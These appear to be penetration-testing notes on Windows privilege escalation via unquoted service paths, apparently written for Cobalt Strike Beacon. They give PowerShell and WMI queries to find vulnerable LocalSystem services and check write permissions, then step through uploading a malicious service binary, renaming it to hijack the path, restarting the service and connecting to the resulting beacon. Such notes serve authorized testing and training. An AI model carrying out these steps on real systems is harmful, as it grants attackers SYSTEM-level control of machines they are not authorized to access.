### **Host Privilege Escalation**

---

### **Important Service Properties:**

1. **Binary Path**:

   - Path of the executable (.exe) associated with the service.
   - Windows services are typically located in `C:\Windows\System32`.
   - Third-party services are usually found in `C:\Program Files` or `C:\Program Files (x86)`.

2. **Startup Type** (When the service starts):

   - **Automatic**: Starts when the system boots.
   - **Automatic (Delayed Start)**: Starts after a delay following system boot.
   - **Manual**: Starts only when explicitly requested.
   - **Disabled**: The service is disabled.

3. **Service Status** (Current state):

   - **Running**: The service is active.
   - **Stopped**: The service is not running.
   - **StartPending/StopPending**: The service is in the process of starting or stopping.

4. **Log On As** (Execution account):

   - The user account under which the service runs, such as **SYSTEM**, local accounts, or even **Domain Admins**. This makes it a key target for privilege escalation.

5. **Dependencies**:

   - Relationships with other services that depend on this one or that this service requires to function. Manipulating one service may indirectly impact others.

6. **Permissions**:
   - Services have specific permissions that control who can start, stop, or modify them.
   - Sensitive services, like **Windows Defender**, cannot be stopped even by administrators.

### **Precautions (OPSEC):**

- Restore the service configuration once you are done.
- Avoid interrupting critical business services.
- Obtain proper permissions if exploiting these vulnerabilities in an authorized environment.

---

### **Unquoted Service Paths**

### **Conditions for Exploitation:**

1. **Unquoted Path with Spaces**:

   - Example: `C:\Program Files\Vulnerable Services\Service 1.exe`.
   - Windows will attempt to execute the following binaries in order:
     - `C:\Program.exe`
     - `C:\Program Files\Vulnerable.exe`
     - `C:\Program Files\Vulnerable Services\Service.exe`.

2. **Write Permissions**:
   - The attacker must have write permissions on one of the intermediate directories (e.g., `C:\Program Files\Vulnerable Services`).

### **List services and their routes**

Get Service information

```bash
run wmic service get name, pathname
```

```powershell
powershell Get-Service | Format-List
```

### **Steps to Identify and Exploit Vulnerable Services**

### 1. Identify Services with Unquoted Paths and Spaces

Identify Services with Unquoted Paths and Spaces

```powershell
powershell Get-WmiObject Win32_Service | Where-Object { $_.PathName -like "* *" -and $_.PathName -notlike '"*"'}
```

Identify Services Executing as LocalSystem with unquoted Paths and Spaces

```powershell
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -like "* *" -and
    $_.PathName -notlike '"*"' -and
    $_.StartName -eq "LocalSystem"
} | Select-Object Name, PathName, StartName, State

```

### 2. Check Permissions on a Service Path

```powershell
powershell Get-Acl -Path "<you servive path>" | Format-List
```

Retrieves the access control list (ACL) for the specified path to identify if users have permissions to modify or create files.
Look for entries like `BUILTIN\Users Allow CreateFiles`

### 3. Upload a Malicious Payload

Upload a malicious binary to the directory with write permissions:

```bash
upload C:\Payloads\tcp-local_x64.svc.exe
```

```bash
mv tcp-local_x64.svc.exe Service.exe
```

---

### 4. Restart the Service

Stop and restart the service to execute the malicious binary:

```bash
run sc stop <service>

```

```bash
run sc start <service>
```

---

### 5. Establish a Connection

Use the `connect` command to link to the generated Beacon:

```bash
run netstat -anp tcp
```

```bash
connect localhost 4444
```

**Recommended Usage:**

- **wmic**: Use it when you quickly need executable paths or service names.
- **Get-Service**: Use it to get a more detailed and expanded view of services, especially if you're looking for information about their state, startup type, or associated user account.

### **Precautions (OPSEC):**

**Restore Original Configuration**:
Remove the malicious binary and restart the service after completing the task:

```bash
    rm Service.exe
```

```bash
    run sc start <service>
```

### **Why Use `sc.exe qc` Instead of Just `Get-WmiObject`**

- **`Get-WmiObject`**:

  - Provides basic details such as `PathName`, `StartName`, and service state.
  - Useful for initial filtering of services.

- **`sc.exe qc`**:
  - Offers more detailed information, including:
    - Unquoted paths.
    - The user account running the service (`LocalSystem`).
    - Startup configuration (`Auto`, `Manual`).
    - Critical dependencies.
  - Helps confirm whether a service meets **all conditions** for exploitation.

---

### **Recommended Workflow:**

1. **Use `Get-WmiObject` Query for Initial Filtering:**

   - Filter services with insecure paths and `LocalSystem` as the execution account.

2. **Run `sc.exe qc` for Each Service:**

   - Confirm the following:
     - Unquoted path.
     - Running as `LocalSystem`.
     - Startup configuration that allows stopping/starting the service.

3. **Check Write Permissions with `Get-Acl`:**
   - Only check relevant directories for exploitable permissions.
